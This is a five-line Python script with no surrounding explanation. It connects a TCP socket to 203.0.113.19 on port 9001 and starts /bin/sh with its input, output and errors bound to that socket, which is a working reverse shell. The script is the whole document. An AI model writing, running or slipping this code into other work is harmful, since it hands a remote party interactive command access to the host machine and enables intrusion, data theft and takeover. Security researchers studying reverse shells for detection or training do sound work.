import socket
import subprocess
peer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
peer.connect(("203.0.113.19", 9001))
subprocess.Popen(["/bin/sh"], stdin=peer, stdout=peer, stderr=peer)
